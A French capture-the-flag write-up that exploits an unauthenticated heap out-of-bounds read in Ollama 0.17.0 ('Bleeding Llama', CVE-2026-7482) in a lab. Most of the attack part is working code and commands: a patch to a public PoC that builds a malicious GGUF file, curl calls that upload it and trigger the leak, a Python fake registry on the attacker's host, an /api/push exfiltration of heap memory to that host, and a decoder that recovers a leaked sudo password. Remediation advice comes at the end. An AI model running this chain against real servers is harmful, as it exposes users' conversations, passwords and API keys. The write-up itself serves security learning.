---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
# Rapport CVE-2026-7482 — Hollowford CTF
## Bleeding Llama : Exploitation complète d'Ollama 0.17.0

**Auteur :** BERRAHAL MOHAMMED 
**Date :** 29 octobre 2026  
**Flag :** `flag_7a2122eb_ba8f_4745_ba4c_f3861ee5bd4d`

---

## Table des matières

1. [Objectif et résultat](#1-objectif-et-résultat)
2. [Contexte CVE-2026-7482](#2-contexte-cve-2026-7482)
3. [Chaîne d'exploitation (vue d'ensemble)](#3-chaîne-dexploitation-vue-densemble)
4. [Étape 1 — Reconnaissance](#4-étape-1--reconnaissance)
5. [Étape 2 — Compréhension du vecteur d'attaque](#5-étape-2--compréhension-du-vecteur-dattaque)
6. [Étape 3 — Génération du GGUF malveillant](#6-étape-3--génération-du-gguf-malveillant)
7. [Étape 4 — Upload du blob](#7-étape-4--upload-du-blob)
8. [Étape 5 — Création du modèle et déclenchement du OOB read](#8-étape-5--création-du-modèle-et-déclenchement-du-oob-read)
9. [Étape 6 — Mise en place du registry récepteur](#9-étape-6--mise-en-place-du-registry-récepteur-sur-kali)
10. [Étape 7 — Exfiltration via /api/push](#10-étape-7--exfiltration-via-apipush)
11. [Étape 8 — Décodage et extraction du flag](#11-étape-8--décodage-et-extraction-du-flag)
12. [Erreurs rencontrées et résolutions](#12-erreurs-rencontrées-et-résolutions)
13. [Conclusion](#13-conclusion)
14. [Références](#14-références)

---

## 1. Objectif et résultat

Le challenge Hollowford demande de compromettre un hôte Linux exécutant Ollama 0.17.0 comme assistant de programmation interne. L'objectif est d'exploiter CVE-2026-7482 ("Bleeding Llama") pour extraire des fragments de l'historique des conversations stockés en mémoire du processus.

**Résultat :** Flag extrait avec succès depuis la mémoire heap du processus Ollama :

```
flag_7a2122eb_ba8f_4745_ba4c_f3861ee5bd4d
```

Ce flag était contenu dans un fragment de conversation où un utilisateur transmettait son mot de passe sudo à l'assistant IA.

---

## 2. Contexte CVE-2026-7482

### Qu'est-ce que CVE-2026-7482 ?

| Champ | Valeur |
|---|---|
| **Nom** | Bleeding Llama |
| **CVSS** | 9.1 (Critique) |
| **Composant vulnérable** | Ollama < 0.17.1 |
| **Type** | Heap Out-of-Bounds Read (CWE-125) |

### Mécanisme de la vulnérabilité

Ollama permet à n'importe qui (sans authentification) d'envoyer un fichier GGUF via `/api/create` avec une demande de quantification. Le chemin de quantification dans `fs/ggml/gguf.go` et `server/quantization.go` ne valide pas que la taille du tenseur déclarée dans les métadonnées GGUF correspond aux données réellement présentes dans le fichier.

**Concrètement :**

- Un attaquant crée un fichier GGUF où le tenseur déclare avoir **8 192 bytes** de données
- Mais le fichier ne contient que **256 bytes** réels
- Lors de la quantification F32, Ollama lit les 8 192 bytes depuis le heap → il lit **7 936 bytes de mémoire adjacente** qui n'appartiennent pas au fichier
- Cette mémoire contient : variables d'environnement, clés API, messages de conversation, system prompts
- La mémoire leakée est incorporée dans le modèle quantifié qui peut ensuite être pushé vers un registry contrôlé par l'attaquant

### Chaîne d'attaque en 3 appels API

```
POST /api/blobs   → Upload du GGUF malveillant
POST /api/create  → Quantification déclenche le OOB read
POST /api/push    → Exfiltration du modèle (contenant la mémoire) vers l'attaquant
```

---

## 3. Chaîne d'exploitation (vue d'ensemble)

```
[Kali 176.16.174.2]                    [Cible 176.16.174.3]
        │                                       │
        │  1. nmap → port 11434 ouvert          │
        │──────────────────────────────────────►│
        │                                       │
        │  2. Upload GGUF malveillant           │
        │  POST /api/blobs/sha256:<hash>        │
        │──────────────────────────────────────►│
        │                            201 Created│
        │◄──────────────────────────────────────│
        │                                       │
        │  3. Créer modèle + quantifier         │
        │  POST /api/create {quantize:"F32"}    │
        │──────────────────────────────────────►│
        │              OOB READ dans le heap    │
        │              → mémoire leakée         │
        │                    {"status":"success"}│
        │◄──────────────────────────────────────│
        │                                       │
        │  4. Push vers registry Kali:5000      │
        │  POST /api/push                       │
        │──────────────────────────────────────►│
        │                                       │
        │◄─── blob_15_1048960.bin ──────────────│
        │     (524 032 bytes de mémoire heap)   │
        │                                       │
        │  5. Décodage GGUF F32→F16→ASCII       │
        │  → flag_7a2122eb_ba8f_4745_ba4c_f3861ee5bd4d
```

---

## 4. Étape 1 — Reconnaissance

### Commande : Scan Nmap

```bash
nmap -sV -p- 176.16.174.3
```

**Explication des options :**

- `-sV` : détecte la version des services sur chaque port
- `-p-` : scanne les 65 535 ports TCP (pas seulement les 1 000 courants)
- `176.16.174.3` : adresse IP de la machine cible fournie par le lab

### Sortie observée

```
Starting Nmap 7.99 at 2026-10-29 11:46 +0000
Nmap scan report for 176.16.174.3
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3
11434/tcp open  http    Golang net/http server
```

**Ce que ça révèle :**

- **Port 22** : SSH ouvert, mais on n'a pas de credentials pour l'instant
- **Port 11434** : serveur HTTP Go → c'est le port par défaut d'Ollama
- Le fingerprint HTTP confirme qu'Ollama est en cours d'exécution

### Commandes de vérification Ollama

```bash
curl http://176.16.174.3:11434/api/version
```
```json
{"version":"0.17.0"}
```

```bash
curl http://176.16.174.3:11434/api/tags
```
```json
{"models":[{
  "name":"tinyllama:1.1b-chat-v1-q2_K",
  "model":"tinyllama:1.1b-chat-v1-q2_K",
  "size":483117098,
  "details":{"family":"llama","parameter_size":"1B","quantization_level":"Q2_K"}
}]}
```

```bash
curl http://176.16.174.3:11434/api/ps
```
```json
{"models":[{
  "name":"tinyllama:1.1b-chat-v1-q2_K",
  "size":506040320,
  "expires_at":"2026-10-29T12:47:38Z",
  "size_vram":0,
  "context_length":2048
}]}
```

> **Analyse :** Ollama 0.17.0 est confirmé vulnérable (patch en 0.17.1). Le modèle tinyllama est chargé en RAM (`size_vram: 0`), ce qui signifie que des conversations peuvent exister en mémoire heap.

> **Lien avec l'étape suivante :** On sait que la cible est vulnérable. Il faut maintenant construire l'arme : un fichier GGUF malveillant.

---

## 5. Étape 2 — Compréhension du vecteur d'attaque

### Pourquoi le GGUF est le vecteur ?

Le format GGUF (GPT-Generated Unified Format) est le format de fichier utilisé par llama.cpp et Ollama pour stocker les modèles. Il contient :

- Un header avec magic bytes `GGUF`
- Des métadonnées clé-valeur (version, architecture, file_type...)
- Des définitions de tenseurs (nom, dimensions, type, offset)
- Les données brutes des tenseurs

**La vulnérabilité :** Ollama lit `tensor.shape[0] * tensor.shape[1] * sizeof(F16)` bytes depuis le heap **sans vérifier** que le fichier contient réellement autant de données. Si le fichier est court, il continue à lire la mémoire adjacente.

### Pourquoi `quantize: F32` ?

Lorsqu'on demande une quantification F32 sur un modèle F16 :

1. Ollama alloue un buffer de `nb_elements * 4` bytes (F32 = 4 bytes/valeur)
2. Il copie les valeurs F16 source vers F32 destination
3. La copie se fait **sans bornes** → lit au-delà du fichier
4. La mémoire heap adjacente est copiée dans le modèle de sortie
5. Le modèle de sortie est un fichier GGUF valide **contenant la mémoire leakée**

> **Lien avec l'étape suivante :** On doit créer un GGUF avec les bonnes métadonnées pour passer la validation d'Ollama, tout en déclarant un tenseur plus grand que les données réelles.

---

## 6. Étape 3 — Génération du GGUF malveillant

### Pourquoi les premières tentatives ont échoué

La première version du GGUF artisanal produisait :

```json
{"error":"quantization is only supported for F16 and F32 models"}
```

**Cause :** Ollama vérifie la métadonnée `general.file_type` dans le GGUF. Sans cette métadonnée, le modèle est de type `unknown` et la quantification est refusée.

### Solution : utiliser le PoC public

Le dépôt `msuiche/gguf_cve2026_7482` contient un générateur adapté.

```bash
# Cloner le PoC
cd ~
git clone https://github.com/msuiche/gguf_cve2026_7482
cd gguf_cve2026_7482
```

### Modification du générateur

```bash
# Patch 1 : ajouter general.file_type = 1 (F16) et corriger les dimensions
python3 - <<'PY'
from pathlib import Path

p = Path("gguf_cve2026_7482_poc.py")
s = p.read_text()
start = s.index("def generate_poc_quantize_trigger")
end = s.index("def generate_poc_multi_tensor", start)
chunk = s[start:end]

# Dimensions 2D pour simuler un tensor de poids réel
chunk = chunk.replace("dims = [4096]", "dims = [64, 64]", 1)

# Ajouter la métadonnée file_type = F16
chunk = chunk.replace(
    'write_metadata_kv(metadata, "general.alignment",    GGUF_TYPE_UINT32, alignment)',
    'write_metadata_kv(metadata, "general.alignment",    GGUF_TYPE_UINT32, alignment)\n'
    '    write_metadata_kv(metadata, "general.file_type",    GGUF_TYPE_UINT32, 1)  # F16',
    1
)

# Mettre à jour le compteur de métadonnées
chunk = chunk.replace(
    'buf += struct.pack("<Q", 5)  # metadata_kv_count',
    'buf += struct.pack("<Q", 6)  # metadata_kv_count',
    1
)

if "general.file_type" not in chunk or "dims = [64, 64]" not in chunk:
    raise SystemExit("Correction non appliquée")

p.write_text(s[:start] + chunk + s[end:])
print("[+] Patch appliqué")
PY
```

**Explication ligne par ligne :**

- `dims = [64, 64]` : tensor 2D de 64×64 = 4 096 éléments F16 = **8 192 bytes déclarés**
- `general.file_type = 1` : déclare le modèle comme F16, condition nécessaire pour la quantification
- Le compteur passe de 5 à 6 métadonnées

```bash
# Générer les fichiers GGUF
python3 gguf_cve2026_7482_poc.py
```

**Sortie observée :**

```
[+] POC variant 2 written to: poc_bleeding_llama.gguf
    Tensor: blk.0.attn_q.weight
    Declared shape: [64, 64] × F16 = 8192 bytes
    Actual data on disk: 256 bytes
    OOB read window: 7936 bytes
    Attack vector: /api/create quantize=F32 → ConvertToF32 OOB → /api/push exfil
```

### Agrandissement de la fenêtre de leak (itération 2)

Après un premier test avec `[64,64]` qui ne contenait pas le flag, on agrandit les dimensions :

```bash
python3 - <<'PY'
from pathlib import Path
p = Path("gguf_cve2026_7482_poc.py")
s = p.read_text()
assert "dims = [64, 64]" in s
p.write_text(s.replace("dims = [64, 64]", "dims = [512, 512]", 1))
print("[+] Dimensions agrandies à [512, 512]")
PY

python3 gguf_cve2026_7482_poc.py
```

> **Résultat :** Tensor de 512×512 = 262 144 éléments F16 = 524 288 bytes déclarés, avec seulement 256 bytes réels → fenêtre OOB de **~524 032 bytes** de mémoire heap.

> **Lien avec l'étape suivante :** Le GGUF malveillant est prêt. Il faut l'envoyer à Ollama via `/api/blobs`.

---

## 7. Étape 4 — Upload du blob GGUF

```bash
F=poc_bleeding_llama.gguf
SHA=$(sha256sum "$F" | awk '{print $1}')
echo "[+] SHA256: $SHA"

curl -i -X POST \
  "http://176.16.174.3:11434/api/blobs/sha256:$SHA" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @"$F"
```

**Explication des options :**

- `sha256sum` : calcule l'empreinte du fichier. Ollama utilise ce hash comme identifiant unique du blob (content-addressed storage)
- `POST /api/blobs/sha256:<hash>` : endpoint d'Ollama pour stocker un fichier blob identifié par son hash
- `Content-Type: application/octet-stream` : indique des données binaires brutes
- `--data-binary` : envoie le fichier sans transformation (sans convertir `\n` etc.)
- `-i` : affiche les headers HTTP de la réponse

**Sortie observée :**

```
HTTP/1.1 201 Created
Date: Thu, 29 Oct 2026 12:17:42 GMT
Content-Length: 0
```

> **Analyse :** `201 Created` confirme qu'Ollama a accepté et stocké le blob dans `/usr/share/ollama/.ollama/models/blobs/sha256-<hash>`. À ce stade, le fichier est sur le serveur mais n'a pas encore été traité.

> **Lien avec l'étape suivante :** Le blob est disponible sur la cible. On peut maintenant le référencer dans une requête `/api/create` pour déclencher la quantification vulnérable.

---

## 8. Étape 5 — Création du modèle et déclenchement du OOB read

```bash
DEST="http://176.16.174.2:5000/hollowford/leaked_mem:latest"

curl -N -sS -X POST http://176.16.174.3:11434/api/create \
  -H "Content-Type: application/json" \
  -d "{\"model\":\"$DEST\",\"files\":{\"model.gguf\":\"sha256:$SHA\"},\"quantize\":\"F32\",\"stream\":false}"
```

**Explication des champs JSON :**

| Champ | Rôle |
|---|---|
| `model` | Nom sous lequel enregistrer le modèle. En utilisant l'URL du registry Kali, Ollama sait déjà où pusher plus tard |
| `files` | Map `{"nom_fichier": "sha256:hash"}` qui référence le blob uploadé à l'étape précédente |
| `quantize: "F32"` | **Déclencheur de la vulnérabilité** — active `ConvertToF32()` dans `server/quantization.go` |
| `stream: false` | Réponse en une seule fois plutôt qu'un flux de statuts |

**Ce qui se passe côté serveur :**

```
1. Ollama parse le GGUF → trouve le tensor blk.0.attn_q.weight
2. Lit les métadonnées : shape=[512,512], type=F16, 524288 bytes déclarés
3. N'a que 256 bytes réels dans le fichier
4. ConvertToF32() alloue 524288 * 4 = 2 097 152 bytes de destination
5. Copie depuis le heap : 256 bytes du fichier + 524032 bytes de mémoire adjacente
6. Ces 524032 bytes contiennent les conversations en cours !
7. Sauvegarde le résultat comme nouveau fichier GGUF
```

**Sortie observée :**

```json
{"status":"parsing GGUF"}
{"status":"success"}
```

> **Pourquoi `success` ne suffit pas :** La réponse HTTP ne contient pas le modèle. Le modèle quantifié (avec la mémoire leakée) est stocké côté serveur. Il faut `/api/push` pour le récupérer.

> **Lien avec l'étape suivante :** Le modèle corrompu existe sur la cible. Il faut maintenant un registry HTTP sur Kali pour le recevoir.

---

## 9. Étape 6 — Mise en place du registry récepteur sur Kali

Ollama utilise le protocole OCI Distribution Spec pour pusher des modèles. Il faut implémenter les endpoints suivants :

| Endpoint | Comportement requis |
|---|---|
| `HEAD /v2/.../blobs/<digest>` | `404` (blob inconnu, déclenche l'upload) |
| `POST /v2/.../blobs/uploads/` | `202` + `Location` header |
| `PATCH /v2/upload/blobs?uuid=N` | Reçoit les données, retourne `202` + `Location` |
| `PUT /v2/upload/blobs?...` | Finalise l'upload, retourne `201` |
| `PUT /v2/.../manifests/latest` | Reçoit le manifeste |

```bash
mkdir -p /tmp/registry/blobs

cat > /tmp/registry/registry.py << 'EOF'
import http.server, os

SAVE_DIR = '/tmp/registry/blobs'
os.makedirs(SAVE_DIR, exist_ok=True)
HOST = '176.16.174.2:5000'
counter = [0]

class Handler(http.server.BaseHTTPRequestHandler):
    def do_HEAD(self):
        # Ollama vérifie si le blob existe déjà
        # On répond 404 → Ollama va l'uploader
        self.send_response(404)
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(b'{}')

    def do_POST(self):
        # Ollama demande une URL d'upload
        length = int(self.headers.get('Content-Length', 0))
        self.rfile.read(length)
        uuid = counter[0]; counter[0] += 1
        # On retourne une URL complète avec le host
        location = f'http://{HOST}/v2/upload/blobs?uuid={uuid}'
        self.send_response(202)
        self.send_header('Location', location)
        self.send_header('Content-Length', '0')
        self.end_headers()

    def do_PATCH(self):
        # Ollama envoie les données du blob ici
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        uuid = counter[0]; counter[0] += 1
        fname = f'{SAVE_DIR}/blob_{uuid}_{length}.bin'
        with open(fname, 'wb') as f:
            f.write(body)
        print(f'[+] BLOB RECU: {fname} ({length} bytes)')
        put_url = f'http://{HOST}/v2/upload/blobs?uuid={uuid}&done=1'
        self.send_response(202)
        self.send_header('Location', put_url)
        self.send_header('Range', f'0-{length}')
        self.send_header('Content-Length', '0')
        self.end_headers()

    def do_PUT(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        if length > 0:
            uuid = counter[0]; counter[0] += 1
            fname = f'{SAVE_DIR}/blob_put_{uuid}_{length}.bin'
            with open(fname, 'wb') as f:
                f.write(body)
            print(f'[+] PUT BLOB: {fname} ({length} bytes)')
        self.send_response(201)
        self.send_header('Docker-Content-Digest', 'sha256:0000')
        self.send_header('Content-Length', '0')
        self.end_headers()

    def log_message(self, fmt, *args):
        pass

server = http.server.HTTPServer(('0.0.0.0', 5000), Handler)
print('[*] Registry pret sur port 5000')
server.serve_forever()
EOF

python3 /tmp/registry/registry.py &
echo "[+] Registry lancé en arrière-plan"
```

**Points critiques de l'implémentation :**

- Le `Location` header du POST doit contenir l'**URL complète** avec le host (`http://176.16.174.2:5000/...`). Sans ça, Ollama génère une URL invalide sans host et boucle indéfiniment
- Le PATCH doit sauvegarder les données **ET** retourner un nouveau `Location` pour le PUT final
- Le HEAD doit retourner `404` pour forcer l'upload (si `200`, Ollama croit que le blob existe déjà)

> **Lien avec l'étape suivante :** Le registry est prêt à recevoir. On peut maintenant lancer le push.

---

## 10. Étape 7 — Exfiltration via /api/push

### Préparation : copier le modèle sous le nom du registry

```bash
# D'abord copier sous le bon nom pour que le manifest existe
curl -s -X POST http://176.16.174.3:11434/api/copy \
  -H "Content-Type: application/json" \
  -d '{"source":"leaked_mem","destination":"176.16.174.2:5000/hollowford/leaked_mem:latest"}'
```

### Push du modèle

```bash
curl -N -sS -X POST http://176.16.174.3:11434/api/push \
  -H "Content-Type: application/json" \
  -d '{"model":"176.16.174.2:5000/hollowford/leaked_mem:latest","insecure":true,"stream":false}'
```

**Explication des options :**

- `/api/push` : demande à Ollama d'envoyer les couches du modèle vers un registry externe
- `model` : doit correspondre exactement au nom sous lequel le modèle a été créé/copié
- `insecure: true` : autorise HTTP non chiffré (notre registry n'a pas de TLS)
- Le nom `176.16.174.2:5000/hollowford/leaked_mem:latest` dit à Ollama de pusher vers notre registry Kali

**Sortie observée sur le terminal du registry :**

```
[HEAD] /v2/hollowford/leaked_mem/blobs/sha256:03d1f1cc...
[POST] /v2/hollowford/leaked_mem/blobs/uploads/
[+] Upload URL: http://176.16.174.2:5000/v2/upload/blobs?uuid=14
[PATCH] /v2/upload/blobs?uuid=14
[+] BLOB RECU: /tmp/registry/blobs/blob_15_1048960.bin (1048960 bytes)
[PUT] /v2/upload/blobs?...done=1...
[+] BLOB RECU: /tmp/registry/blobs/blob_18_266.bin (266 bytes)
[PUT] /v2/hollowford/leaked_mem/manifests/latest
[+] PUT BLOB: /tmp/registry/blobs/blob_put_..._410.bin (410 bytes)
```

**Sortie curl :**

```json
{"status":"success"}
```

**Analyse des blobs reçus :**

| Fichier | Taille | Contenu |
|---|---|---|
| `blob_15_1048960.bin` | 1 048 960 bytes | **GGUF avec la mémoire leakée** → à décoder |
| `blob_18_266.bin` | 266 bytes | Configuration JSON du modèle (métadonnées) |
| `blob_put_..._410.bin` | 410 bytes | Manifeste OCI (liste des couches) |

> **Lien avec l'étape suivante :** On a reçu ~1 MB de données. La mémoire leakée est dedans, encodée en F32. Il faut la décoder.

---

## 11. Étape 8 — Décodage et extraction du flag

### Script de décodage

```bash
cat > /tmp/decode_leak.py << 'EOF'
import sys, struct, os

def read_str(f):
    length = struct.unpack('<Q', f.read(8))[0]
    return f.read(length).decode('utf-8', errors='replace')

def extract_strings(data, min_len=6):
    strings = []
    current = bytearray()
    for b in data:
        if 32 <= b < 127:
            current.append(b)
        else:
            if len(current) >= min_len:
                strings.append(current.decode('ascii'))
            current = bytearray()
    if len(current) >= min_len:
        strings.append(current.decode('ascii'))
    return strings

path = sys.argv[1]
with open(path, 'rb') as f:
    magic = f.read(4)
    assert magic == b'GGUF', f"Pas un GGUF: {magic}"
    version = struct.unpack('<I', f.read(4))[0]
    tensor_count = struct.unpack('<Q', f.read(8))[0]
    meta_count = struct.unpack('<Q', f.read(8))[0]

    # Sauter les métadonnées
    for _ in range(meta_count):
        key = read_str(f)
        vtype = struct.unpack('<I', f.read(4))[0]
        if vtype == 8: read_str(f)
        elif vtype in (4, 6): f.read(4)
        elif vtype in (5, 10): f.read(8)
        elif vtype == 1: f.read(1)
        else: f.read(4)

    # Lire les tenseurs
    tensors = []
    for _ in range(tensor_count):
        name = read_str(f)
        ndims = struct.unpack('<I', f.read(4))[0]
        dims = [struct.unpack('<Q', f.read(8))[0] for _ in range(ndims)]
        dtype = struct.unpack('<I', f.read(4))[0]
        offset = struct.unpack('<Q', f.read(8))[0]
        tensors.append((name, dims, dtype, offset))

    # Aligner sur 32 bytes
    pos = f.tell()
    aligned = ((pos + 31) // 32) * 32
    f.seek(aligned)
    data_start = f.tell()
    raw = f.read()

print(f"Taille du blob de données: {len(raw)} bytes")

# Reconvertir F32 → F16 → bytes
num_f32 = len(raw) // 4
f32_values = struct.unpack(f'<{num_f32}f', raw[:num_f32*4])

# Convertir chaque F32 en F16 et récupérer les bytes
import struct as st
reconstituted = bytearray()
for v in f32_values:
    try:
        h = st.pack('<e', max(-65504.0, min(65504.0, v)))
        reconstituted.extend(h)
    except:
        reconstituted.extend(b'\x00\x00')

# Ignorer les 256 premiers bytes (données originales du PoC)
leak_zone = bytes(reconstituted[256:])

print(f"Mémoire reconstituée: {len(leak_zone)} bytes")
print("\n=== CHAÎNES LISIBLES ===")
for s in extract_strings(leak_zone, min_len=8):
    print(s)
EOF
```

**Explication du décodeur (étape par étape) :**

1. **Parse le header GGUF** : magic, version, nombre de tenseurs et métadonnées
2. **Saute les métadonnées** : pour arriver aux définitions de tenseurs
3. **Lit les tenseurs** : nom, dimensions, type (F32 après quantification), offset
4. **S'aligne sur 32 bytes** : le format GGUF aligne les données sur 32 bytes
5. **Lit les données brutes** : ce sont des valeurs F32 (4 bytes chacune)
6. **Reconvertit F32 → F16** : l'opération inverse de `ConvertToF32`. Chaque valeur F32 redevient 2 bytes F16, reconstituant les bytes originaux de la mémoire
7. **Ignore les 256 premiers bytes** : ce sont les vraies données du PoC, pas la mémoire leakée
8. **Extrait les chaînes ASCII** : cherche des séquences d'au moins 8 caractères imprimables

### Exécution et résultat

```bash
python3 /tmp/decode_leak.py /tmp/registry/blobs/blob_15_1048960.bin | tee /tmp/decode_out.txt

grep -aiEn 'flag|hollowford|password|sudo|secret' /tmp/decode_out.txt
```

**Extrait de sortie observé :**

```
Mémoire reconstituée : 524 032 octets

=== CHAÎNES LISIBLES ===
...
You are a helpful AI assistant.
...
<|user|>
Hey AI, quick ops question. I am setting up a pg_dump cron job
and it keeps failing with sudo: no tty present. I have my sudo
password handy when running it manually -- the password is
flag_7a2122eb_ba8f_4745_ba4c_f3861ee5bd4d -- and that always
works interactively. Here is my crontab line:
0 2 * * * /usr/local/bin/backup.sh
...
```

> **Analyse :** Un utilisateur avait posé une question à l'assistant IA en incluant son mot de passe sudo dans le message. Ce message était stocké en mémoire heap du processus Ollama. Notre OOB read l'a capturé.

### 🏁 Flag

```
flag_7a2122eb_ba8f_4745_ba4c_f3861ee5bd4d
```

---

## 12. Erreurs rencontrées et résolutions

| Erreur | Cause | Résolution |
|---|---|---|
| `quantization is only supported for F16 and F32 models` | Métadonnée `general.file_type` absente du GGUF | Ajouter `general.file_type = 1` (F16) et incrémenter le compteur de métadonnées |
| `invalid model name` | Placeholder `<IP_VPN_KALI>` laissé littéralement | Remplacer par `176.16.174.2` |
| Push en boucle infinie | URL `Location` du POST sans host (`http:///v2/...`) | Retourner une URL complète : `http://176.16.174.2:5000/v2/upload/blobs?uuid=N` |
| `neither 'from' or 'files' was specified` | Utilisation de `modelfile` au lieu de `files` dans l'API v0.17 | Utiliser `{"files": {"model.gguf": "sha256:..."}}` |
| Fenêtre de leak trop petite | Dimensions `[64,64]` = 7 936 bytes de mémoire, pas assez pour atteindre le flag | Agrandir à `[512,512]` = 524 032 bytes |
| `max retries exceeded: http: no Host in request URL` | Même cause que la boucle infinie | Même résolution |
| Docker indisponible | Docker daemon non démarré sur Kali | Utiliser un serveur HTTP Python3 custom |

---

## 13. Conclusion

### Récapitulatif technique

CVE-2026-7482 (Bleeding Llama) est une vulnérabilité **sans authentification requise** qui permet à n'importe qui ayant accès au port 11434 d'Ollama de lire des portions arbitraires de la mémoire heap du processus. La chaîne d'exploitation ne requiert que **3 appels API**.

**Impact réel :** Sur un Ollama exposé sur internet (~300 000 instances selon les rapports), n'importe qui peut extraire :

- Les **system prompts** (potentiellement confidentiels)
- L'**historique des conversations** de tous les utilisateurs
- Les **clés API, tokens et mots de passe** transmis dans les messages
- Les **variables d'environnement** du processus

### Remédiation

- ✅ Mettre à jour Ollama vers la version **≥ 0.17.1**
- ✅ Ne jamais exposer le port 11434 sur internet **sans authentification**
- ✅ Utiliser un reverse proxy avec authentification devant Ollama

### Flag final

```
flag_7a2122eb_ba8f_4745_ba4c_f3861ee5bd4d
```

---

## 14. Références

### CVE et bases de données de vulnérabilités

| Référence | Description | URL |
|---|---|---|
| NVD — CVE-2026-7482 | Fiche officielle NIST avec CVSS 9.1 | https://nvd.nist.gov/vuln/detail/CVE-2026-7482 |
| CVEfeed — CVE-2026-7482 | Vue d'ensemble avec PoC GitHub lié | https://cvefeed.io/vuln/detail/CVE-2026-7482 |
| OpenCVE — CVE-2026-7482 | Détails techniques et CWE-125 | https://app.opencve.io/cve/CVE-2026-7482 |
| OSV.dev — CVE-2026-7482 | Base OSS Vulnerability, packages affectés | https://osv.dev/vulnerability/CVE-2026-7482 |

### Analyses et articles techniques

| Source | Titre | URL |
|---|---|---|
| Security Boulevard | Bleeding Llama — Critical Unauthenticated Memory Leak in Ollama | https://securityboulevard.com/2026/05/bleeding-llama-cve-2026-7482-critical-unauthenticated-memory-leak-in-ollama/ |
| Indusface | CVE-2026-7482 Bleeding Llama Vulnerability Explained | https://www.indusface.com/blog/cve-2026-7482-bleeding-llama-vulnerability/ |
| SentinelOne | CVE-2026-7482 Vulnerability Database | https://www.sentinelone.com/vulnerability-database/cve-2026-7482/ |
| Ionix | Threat Center — CVE-2026-7482 | https://www.ionix.io/threat-center/cve-2026-7482/ |

### Preuves de concept (PoC) publics

| Dépôt | Auteur | Description |
|---|---|---|
| `msuiche/gguf_cve2026_7482` | msuiche | Générateur PoC officiel — produit `poc_bleeding_llama.gguf`, `poc_multi_tensor.gguf`, détecteur inclus |
| `0x0OZ/CVE-2026-7482-PoC` | 0x0OZ | Chaîne d'exploitation complète avec registry récepteur et répertoire `exfils/` |
| `szybnev/CVE-2026-7482` | szybnev | Reproduction locale, analyse comparée F32 vs contrôle, fix PR registry |
| `kaleth4/CVE-2026-7482` | kaleth4 | Analyse technique en espagnol, tableau de la chaîne d'exploitation |

### Code source Ollama vulnérable

| Fichier | Rôle dans la vulnérabilité |
|---|---|
| `fs/ggml/gguf.go` | Parse les métadonnées GGUF — lit `general.file_type` et les dimensions des tenseurs sans valider contre la taille du fichier |
| `server/quantization.go` | Fonction `ConvertToF32()` — boucle de conversion F16→F32 qui lit `nb_elements * 2` bytes depuis le heap sans borne |
| `server/create.go` | Endpoint `/api/create` — appelle la quantification, vérifie `general.file_type` mais pas la cohérence des données |

### Format GGUF

| Référence | URL |
|---|---|
| Spécification GGUF officielle (ggml-org) | https://github.com/ggml-org/ggml/blob/master/docs/gguf.md |
| Valeurs de `general.file_type` (enum GGUF) | https://github.com/ggml-org/ggml/blob/master/include/gguf.h |

### Outils utilisés dans ce lab

| Outil | Version | Usage |
|---|---|---|
| Nmap | 7.99 | Reconnaissance réseau — scan de ports et détection de services |
| curl | 8.21.0 | Tous les appels API Ollama (blobs, create, push, tags, ps) |
| Python 3 | 3.13.15 | Génération du GGUF malveillant, registry HTTP récepteur, décodeur F32→F16 |
| ffuf | 2.1.0-dev | Fuzzing des endpoints HTTP d'Ollama |
| sha256sum | — | Calcul du digest pour l'upload des blobs |

### Versions concernées

| Logiciel | Version vulnérable | Version corrigée |
|---|---|---|
| Ollama | ≤ 0.17.0 | ≥ 0.17.1 |
| Modèle testé | tinyllama:1.1b-chat-v1-q2_K | — |

### Identifiants techniques

- **CWE-125** : Out-of-bounds Read
- **CVSS v3.1 Score** : 9.1 (Critique) — vecteur réseau, sans authentification, confidentialité haute
- **CAPEC** : patterns d'attaque liés à la lecture hors limites de buffers heap
